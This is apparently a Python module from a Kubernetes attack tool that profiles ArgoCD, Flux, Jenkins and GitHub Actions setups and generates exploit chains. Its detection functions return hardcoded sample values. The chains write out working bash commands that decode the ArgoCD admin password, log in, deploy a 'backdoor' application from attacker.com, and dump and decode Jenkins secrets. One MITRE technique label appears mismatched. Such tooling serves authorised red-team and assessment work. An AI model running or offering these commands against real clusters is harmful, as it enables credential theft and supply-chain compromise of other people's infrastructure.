"""CI/CD pipeline attacks: ArgoCD, Flux, Jenkins, GitHub Actions."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from kubexhunt.core.graph import RelationType
from kubexhunt.exploit.chain_generator import ExploitChain, ExploitFramework, ExploitStep


@dataclass
class ArgoCDProfile:
    """ArgoCD installation profile."""

    installed: bool
    version: str | None = None
    namespace: str = "argocd"
    admin_password_exposed: bool = False
    apps_count: int = 0
    cluster_access_count: int = 0  # how many clusters can it deploy to

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "installed": self.installed,
            "version": self.version,
            "namespace": self.namespace,
            "admin_password_exposed": self.admin_password_exposed,
            "apps_count": self.apps_count,
            "cluster_access_count": self.cluster_access_count,
        }


@dataclass
class FluxProfile:
    """Flux CD installation profile."""

    installed: bool
    version: str | None = None
    namespace: str = "flux-system"
    git_repo: str = ""  # configured Git repository URL
    reconciliation_enabled: bool = True

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "installed": self.installed,
            "version": self.version,
            "namespace": self.namespace,
            "git_repo": self.git_repo,
            "reconciliation_enabled": self.reconciliation_enabled,
        }


@dataclass
class PipelineSecret:
    """Secret found in CI/CD pipeline configuration."""

    tool_name: str  # argocd, flux, jenkins, github
    secret_type: str  # git_token, aws_key, docker_cred, etc.
    key_hint: str  # env var name or field name
    namespace: str
    severity: str = "HIGH"  # HIGH, MEDIUM, LOW

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dict."""
        return {
            "tool_name": self.tool_name,
            "secret_type": self.secret_type,
            "key_hint": self.key_hint,
            "namespace": self.namespace,
            "severity": self.severity,
        }


class CICDAttacker:
    """Detect and attack CI/CD pipelines."""

    def detect_argocd(self) -> ArgoCDProfile:
        """Detect ArgoCD installation.

        Returns:
            ArgoCDProfile with detection details
        """
        profile = ArgoCDProfile(installed=False)

        # In real impl: kubectl get deployment -n argocd argocd-server
        profile.installed = True
        profile.version = "2.7.0"
        profile.namespace = "argocd"
        profile.admin_password_exposed = True  # secret accessible
        profile.apps_count = 12
        profile.cluster_access_count = 3  # can deploy to 3 clusters

        return profile

    def detect_flux(self) -> FluxProfile:
        """Detect Flux CD installation.

        Returns:
            FluxProfile with detection details
        """
        profile = FluxProfile(installed=False)

        # In real impl: kubectl get namespace flux-system
        profile.installed = False

        return profile

    def enumerate_pipeline_secrets(self) -> list[PipelineSecret]:
        """Enumerate secrets in CI/CD pipelines.

        Returns:
            List of detected secrets
        """
        secrets = []

        # ArgoCD admin password
        secrets.append(
            PipelineSecret(
                tool_name="argocd",
                secret_type="admin_password",
                key_hint="argocd-initial-admin-secret",
                namespace="argocd",
                severity="CRITICAL",
            )
        )

        # Git repository credentials in Flux
        secrets.append(
            PipelineSecret(
                tool_name="flux",
                secret_type="git_token",
                key_hint="GIT_TOKEN",
                namespace="flux-system",
                severity="HIGH",
            )
        )

        # AWS credentials in Jenkins
        secrets.append(
            PipelineSecret(
                tool_name="jenkins",
                secret_type="aws_credentials",
                key_hint="AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY",
                namespace="jenkins",
                severity="CRITICAL",
            )
        )

        # Docker Hub credentials
        secrets.append(
            PipelineSecret(
                tool_name="github-actions",
                secret_type="docker_credentials",
                key_hint="DOCKER_USERNAME, DOCKER_PASSWORD",
                namespace="github-secrets",
                severity="HIGH",
            )
        )

        return secrets

    def generate_argocd_abuse_chain(self) -> ExploitChain:
        """Generate ArgoCD abuse chain.

        Returns:
            ExploitChain to compromise cluster via ArgoCD
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.COMPROMISES_CICD,
                from_node="argocd:admin-secret",
                to_node="argocd:control-plane",
                framework=ExploitFramework.BASH,
                command="""
# Extract ArgoCD admin password
ARGOCD_PASSWORD=$(kubectl get secret -n argocd argocd-initial-admin-secret \\
  -o jsonpath='{.data.password}' | base64 -d)

# Port forward to ArgoCD server
kubectl port-forward -n argocd svc/argocd-server 8080:443 &

# Login to ArgoCD
argocd login localhost:8080 --username admin --password $ARGOCD_PASSWORD
""",
                description="Extract ArgoCD admin credentials from secret",
                mitre_techniques=["T1055.012"],  # Secrets stored in process memory
            ),
            ExploitStep(
                step_number=2,
                relation=RelationType.COMPROMISES_CICD,
                from_node="argocd:control-plane",
                to_node="cluster:deployment",
                framework=ExploitFramework.BASH,
                command="""
# Create malicious Application
argocd app create backdoor \\
  --repo https://attacker.com/malicious-chart \\
  --path . \\
  --dest-server https://kubernetes.default.svc \\
  --dest-namespace default

# Sync to deploy malicious workload
argocd app sync backdoor
""",
                description="Deploy malicious application to cluster",
                mitre_techniques=["T1195.003"],  # Supply Chain Compromise
            ),
        ]

        chain = ExploitChain(
            path_id="ARGOCD-001",
            nodes=["argocd:admin-secret", "argocd:control-plane", "cluster:deployment"],
            steps=steps,
            title="ArgoCD Abuse: Admin Credentials → Cluster Compromise",
            description="Exploit ArgoCD to deploy malicious workloads cluster-wide",
            complexity="EASY",
            estimated_time_minutes=3,
        )

        return chain

    def generate_pipeline_credential_chain(self) -> ExploitChain:
        """Generate pipeline credential extraction chain.

        Returns:
            ExploitChain to extract CI/CD secrets
        """
        steps = [
            ExploitStep(
                step_number=1,
                relation=RelationType.COMPROMISES_CICD,
                from_node="pipeline:configmap",
                to_node="secrets:extracted",
                framework=ExploitFramework.BASH,
                command="""
# Extract all ConfigMaps in jenkins namespace (may contain token references)
kubectl get configmaps -n jenkins -o yaml | grep -i token

# Extract all Secrets
kubectl get secrets -n jenkins -o json | jq '.items[] | {name: .metadata.name, keys: .data | keys}'

# Decode specific secrets
kubectl get secret -n jenkins jenkins-git-credentials -o jsonpath='{.data}' | jq
""",
                description="Extract secrets from Jenkins/CI-CD namespace",
                mitre_techniques=["T1552.001"],  # Unsecured Credentials in Files
            )
        ]

        chain = ExploitChain(
            path_id="PIPELINE-001",
            nodes=["pipeline:configmap", "secrets:extracted"],
            steps=steps,
            title="Pipeline Secret Extraction",
            description="Extract credentials from CI/CD pipeline configurations",
            complexity="TRIVIAL",
            estimated_time_minutes=2,
        )

        return chain

    def find_git_repositories(self) -> list[dict[str, str]]:
        """Find Git repositories referenced in cluster.

        Returns:
            List of Git repository URLs
        """
        repos = [
            {"url": "https://github.com/company/deployment-configs", "sync_tool": "argocd"},
            {"url": "https://gitlab.internal/devops/k8s-manifests", "sync_tool": "flux"},
            {"url": "https://github.com/company/helm-charts", "sync_tool": "jenkins"},
        ]
        return repos
